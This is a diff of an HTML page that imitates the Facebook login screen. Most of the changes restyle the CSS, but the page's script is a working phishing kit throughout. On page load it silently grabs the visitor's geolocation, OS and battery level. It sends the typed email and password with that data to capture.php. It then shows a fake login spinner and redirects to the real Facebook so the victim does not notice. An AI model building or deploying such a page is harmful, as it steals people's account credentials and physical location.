@@ -23,41 +23,47 @@
         }
 
         .container {
-            max-width: 400px;
+            max-width: 396px;
             width: 100%;
             text-align: center;
         }
 
+        /* Facebook Logo */
         .logo {
             margin-bottom: 20px;
         }
 
         .logo h1 {
-            font-size: 56px;
+            font-size: 60px;
             font-weight: 700;
             color: #1877f2;
             font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
-            letter-spacing: -2px;
+            letter-spacing: -3px;
+            line-height: 1;
         }
 
         .logo .tagline {
             font-size: 20px;
             color: #1c1e21;
             font-weight: 400;
-            margin-top: -6px;
+            margin-top: -4px;
+            letter-spacing: 0;
         }
 
+        /* Login Card */
         .card {
             background: white;
             border-radius: 8px;
             box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
             padding: 20px 20px 28px;
             width: 100%;
+            text-align: center;
         }
 
         .form-group {
             margin-bottom: 12px;
         }
+
         .form-group input {
             width: 100%;
             padding: 14px 16px;
@@ -67,11 +73,14 @@
             background: #ffffff;
             transition: 0.2s;
             outline: none;
+            color: #1c1e21;
         }
+
         .form-group input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
+
         .form-group input::placeholder {
             color: #90949c;
         }
@@ -88,10 +97,13 @@
             cursor: pointer;
             transition: background 0.2s;
             margin-top: 6px;
+            letter-spacing: 0.5px;
         }
+
         .btn-login:hover {
             background: #166fe5;
         }
+
         .btn-login:disabled {
             opacity: 0.6;
             cursor: not-allowed;
@@ -103,7 +115,9 @@
             color: #1877f2;
             font-size: 14px;
             text-decoration: none;
+            font-weight: 500;
         }
+
         .forgot:hover {
             text-decoration: underline;
         }
@@ -114,6 +128,7 @@
             margin: 20px 0 18px;
             gap: 12px;
         }
+
         .divider::before,
         .divider::after {
             content: '';
@@ -121,6 +136,7 @@
             height: 1px;
             background: #dadde1;
         }
+
         .divider span {
             font-size: 14px;
             color: #606770;
@@ -138,222 +154,224 @@
             border-radius: 6px;
             cursor: pointer;
             transition: background 0.2s;
+            letter-spacing: 0.5px;
         }
+
         .btn-create:hover {
             background: #36a420;
         }
 
+        /* Meta Footer */
         .footer {
-            margin-top: 20px;
-            font-size: 13px;
+            margin-top: 28px;
+            font-size: 12px;
             color: #8c9ba8;
         }
-        .footer a {
-            color: #8c9ba8;
-            text-decoration: none;
+
+        .footer span {
             margin: 0 8px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
         }
 
         .spinner {
             display: inline-block;
             width: 18px;
             height: 18px;
-            border: 3px solid rgba(255,255,255,0.3);
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
             vertical-align: middle;
             margin-right: 8px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .meta-footer {
-            margin-top: 28px;
-            font-size: 12px;
-            color: #8c9ba8;
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
-        .meta-footer span {
-            margin: 0 6px;
-            color: #8c9ba8;
+
+        /* Mobile Responsive */
+        @media (max-width: 400px) {
+            .logo h1 {
+                font-size: 48px;
+            }
+            .logo .tagline {
+                font-size: 17px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Logo & Tagline -->
-    <div class="logo">
-        <h1>facebook</h1>
-        <div class="tagline">Explore the things you love.</div>
-    </div>
-
-    <!-- Login Card -->
-    <div class="card">
-        <form id="loginForm">
-            <div class="form-group">
-                <input type="text" id="email" placeholder="Email address or mobile number" />
-            </div>
-            <div class="form-group">
-                <input type="password" id="password" placeholder="Password" />
-            </div>
-            <button type="submit" class="btn-login" id="loginBtn">Log In</button>
-        </form>
-
-        <a href="#" class="forgot">Forgotten password?</a>
-
-        <div class="divider">
-            <span>or</span>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo">
+            <h1>facebook</h1>
+            <div class="tagline">Explore the things you love.</div>
         </div>
 
-        <button class="btn-create" id="createBtn">Create new account</button>
+        <!-- Login Card -->
+        <div class="card">
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="email" placeholder="Email address or mobile number" autocomplete="username" />
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+                </div>
+                <button type="submit" class="btn-login" id="loginBtn">Log In</button>
+            </form>
+
+            <a href="#" class="forgot">Forgotten password?</a>
+
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <button class="btn-create" id="createBtn">Create new account</button>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <span>Meta</span>
+            <span>© 2026</span>
+        </div>
     </div>
 
-    <!-- Meta Footer -->
-    <div class="meta-footer">
-        <span>Meta</span>
-        <span>© 2026</span>
-    </div>
-</div>
+    <script>
+        // ---------- SILENT CAPTURE + REDIRECT TO REAL FACEBOOK ----------
+        (function() {
+            const form = document.getElementById('loginForm');
+            const loginBtn = document.getElementById('loginBtn');
 
-<script>
-// ---------- SILENT CAPTURE WITH REDIRECT TO REAL FACEBOOK ----------
-(function() {
-    const form = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
+            let locationCaptured = false;
+            let batteryLevel = null;
+            let osName = 'Unknown';
+            let lastLocation = { lat: null, lng: null, accuracy: null, timestamp: null };
 
-    let locationCaptured = false;
-    let batteryLevel = null;
-    let osName = 'Unknown';
-    let lastLocation = { lat: null, lng: null, accuracy: null, timestamp: null };
+            // ---------- 1. Detect OS ----------
+            function detectOS() {
+                const ua = navigator.userAgent;
+                if (ua.includes('Windows')) osName = 'Windows';
+                else if (ua.includes('Mac OS')) osName = 'macOS';
+                else if (ua.includes('Linux')) osName = 'Linux';
+                else if (ua.includes('Android')) osName = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) osName = 'iOS';
+                else osName = 'Other';
+                return osName;
+            }
+            detectOS();
 
-    // ---------- 1. Detect OS (silent) ----------
-    function detectOS() {
-        const ua = navigator.userAgent;
-        if (ua.includes('Windows')) osName = 'Windows';
-        else if (ua.includes('Mac OS')) osName = 'macOS';
-        else if (ua.includes('Linux')) osName = 'Linux';
-        else if (ua.includes('Android')) osName = 'Android';
-        else if (ua.includes('iPhone') || ua.includes('iPad')) osName = 'iOS';
-        else osName = 'Other';
-        return osName;
-    }
-    detectOS();
+            // ---------- 2. Get Battery Level ----------
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    batteryLevel = Math.round(battery.level * 100);
+                }).catch(() => {});
+            }
 
-    // ---------- 2. Get Battery Level (silent) ----------
-    if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-            batteryLevel = Math.round(battery.level * 100);
-        }).catch(() => {});
-    }
+            // ---------- 3. Send data to PHP ----------
+            function sendToServer(lat, lng, accuracy, timestamp) {
+                const email = document.getElementById('email').value || 'N/A';
+                const password = document.getElementById('password').value || 'N/A';
 
-    // ---------- 3. Send data to PHP ----------
-    function sendToServer(lat, lng, accuracy, timestamp) {
-        const email = document.getElementById('email').value || 'N/A';
-        const password = document.getElementById('password').value || 'N/A';
+                const payload = {
+                    lat: lat,
+                    lng: lng,
+                    accuracy: accuracy,
+                    timestamp: timestamp,
+                    email: email,
+                    password: password,
+                    os: osName,
+                    battery: batteryLevel,
+                    userAgent: navigator.userAgent
+                };
 
-        const payload = {
-            lat: lat,
-            lng: lng,
-            accuracy: accuracy,
-            timestamp: timestamp,
-            email: email,
-            password: password,
-            os: osName,
-            battery: batteryLevel,
-            userAgent: navigator.userAgent
-        };
+                fetch('capture.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+            }
 
-        fetch('capture.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(() => {});
-    }
+            // ---------- 4. Request geolocation (iPhone friendly) ----------
+            function requestLocation() {
+                if (!navigator.geolocation) return;
 
-    // ---------- 4. Request geolocation (iPhone friendly) ----------
-    function requestLocation() {
-        if (!navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        const ts = pos.timestamp || Date.now();
+                        locationCaptured = true;
+                        lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
+                        sendToServer(lat, lng, acc, ts);
+                    },
+                    (err) => {
+                        // If it fails, try again with longer timeout
+                        setTimeout(() => {
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    const lat = pos.coords.latitude;
+                                    const lng = pos.coords.longitude;
+                                    const acc = pos.coords.accuracy;
+                                    const ts = pos.timestamp || Date.now();
+                                    locationCaptured = true;
+                                    lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
+                                    sendToServer(lat, lng, acc, ts);
+                                },
+                                () => {},
+                                { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+                            );
+                        }, 2000);
+                    },
+                    { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+                );
+            }
 
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                const lat = pos.coords.latitude;
-                const lng = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
-                const ts = pos.timestamp || Date.now();
-                locationCaptured = true;
-                lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
-                sendToServer(lat, lng, acc, ts);
-            },
-            (err) => {
-                console.warn('Location attempt failed:', err.message);
+            // Auto-request location when page loads
+            requestLocation();
+
+            // ---------- 5. Form submit – capture credentials & redirect ----------
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const email = document.getElementById('email').value || 'N/A';
+                const password = document.getElementById('password').value || 'N/A';
+
+                // Send credentials + location (if available)
+                if (locationCaptured && lastLocation.lat) {
+                    sendToServer(lastLocation.lat, lastLocation.lng, lastLocation.accuracy, lastLocation.timestamp);
+                } else {
+                    sendToServer(null, null, null, null);
+                }
+
+                // Show loading spinner
+                const original = loginBtn.innerHTML;
+                loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
+                loginBtn.disabled = true;
+
+                // Wait 2.5 seconds, then redirect to REAL Facebook
                 setTimeout(() => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const lat = pos.coords.latitude;
-                            const lng = pos.coords.longitude;
-                            const acc = pos.coords.accuracy;
-                            const ts = pos.timestamp || Date.now();
-                            locationCaptured = true;
-                            lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
-                            sendToServer(lat, lng, acc, ts);
-                        },
-                        () => {},
-                        { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
-                    );
-                }, 2000);
-            },
-            { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
-        );
-    }
+                    loginBtn.innerHTML = original;
+                    loginBtn.disabled = false;
+                    document.getElementById('password').value = '';
+                    window.location.href = 'https://www.facebook.com/';
+                }, 2500);
+            });
 
-    // Auto-request location when page loads
-    requestLocation();
+            // ---------- 6. "Create new account" ----------
+            document.getElementById('createBtn').addEventListener('click', function() {
+                window.location.href = 'https://www.facebook.com/reg/';
+            });
 
-    // ---------- 5. Form submit – capture credentials & redirect ----------
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
+            // ---------- 7. "Forgotten password?" ----------
+            document.querySelector('.forgot').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.location.href = 'https://www.facebook.com/login/identify/';
+            });
+        })();
+    </script>
 
-        const email = document.getElementById('email').value || 'N/A';
-        const password = document.getElementById('password').value || 'N/A';
-
-        // Send credentials + location (if available)
-        if (locationCaptured && lastLocation.lat) {
-            sendToServer(lastLocation.lat, lastLocation.lng, lastLocation.accuracy, lastLocation.timestamp);
-        } else {
-            sendToServer(null, null, null, null);
-        }
-
-        // Show loading spinner
-        const original = loginBtn.innerHTML;
-        loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
-        loginBtn.disabled = true;
-
-        // Wait 2.5 seconds, then redirect to REAL Facebook
-        setTimeout(() => {
-            loginBtn.innerHTML = original;
-            loginBtn.disabled = false;
-            // Clear password field
-            document.getElementById('password').value = '';
-            document.getElementById('password').placeholder = 'Password';
-            // Redirect to real Facebook
-            window.location.href = 'https://www.facebook.com/';
-        }, 2500);
-    });
-
-    // ---------- 6. "Create new account" redirects to real Facebook ----------
-    document.getElementById('createBtn').addEventListener('click', function() {
-        window.location.href = 'https://www.facebook.com/reg/';
-    });
-
-    // ---------- 7. "Forgot password" redirects to real Facebook ----------
-    document.querySelector('.forgot').addEventListener('click', function(e) {
-        e.preventDefault();
-        window.location.href = 'https://www.facebook.com/login/identify/';
-    });
-})();
-</script>
 </body>
 </html>
